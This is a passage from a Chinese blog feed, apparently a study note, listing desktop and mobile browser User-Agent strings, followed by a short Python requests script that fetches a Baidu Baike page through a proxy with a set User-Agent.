QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span><br><span class="line"></span><br><span class="line"><span class="attribute">QQæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)</span><br><span class="line"></span><br><span class="line"><span class="attribute">sogouæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line"></span><br><span class="line"><span class="attribute">maxthonæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCæµè§ˆå™¨</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36</span><br></pre></td></tr></table></figure></div><hr><h1 id="ç§»åŠ¨ç«¯"><a href="#ç§»åŠ¨ç«¯" class="headerlink" title="ç§»åŠ¨ç«¯"></a>ç§»åŠ¨ç«¯</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">IPhone</span></span><br><span class="line">Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPod</span></span><br><span class="line">Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">IPAD</span></span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">Android</span></span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">QQæµè§ˆå™¨ Androidç‰ˆæœ¬</span><br><span class="line">MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">Android Opera Mobile</span><br><span class="line">Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10</span><br><span class="line"></span><br><span class="line">Android Pad Moto Xoom</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"></span><br><span class="line"><span class="attribute">BlackBerry</span></span><br><span class="line">Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+</span><br><span class="line"></span><br><span class="line">WebOS HP Touchpad</span><br><span class="line">Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0</span><br><span class="line"></span><br><span class="line">Nokia N97</span><br><span class="line">Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124</span><br><span class="line"></span><br><span class="line">Windows Phone Mango</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCæµè§ˆå™¨</span></span><br><span class="line"><span class="attribute">UCWEB7.0.2.37/28/999</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">NOKIA5700/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line"><span class="attribute">UCOpenwave</span></span><br><span class="line">Openwave/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">UC Opera</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure></div><hr><h1 id="Python3-ä¸­çš„çˆ¬è™«"><a href="#Python3-ä¸­çš„çˆ¬è™«" class="headerlink" title="Python3 ä¸­çš„çˆ¬è™«"></a>Python3 ä¸­çš„çˆ¬è™«</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">u"https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fr=aladdin"</span></span><br><span class="line">    user_agent=<span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span></span><br><span class="line">    header=&#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://125.120.11.219:6666"</span>&#125;</span><br><span class="line">    response=requests.get(url,headers=header,proxies=proxies)</span><br><span class="line">    <span class="keyword">print</span> (response.text)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç™¾åº¦æ•´ç†çš„(copy é›¾)&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
</feed>
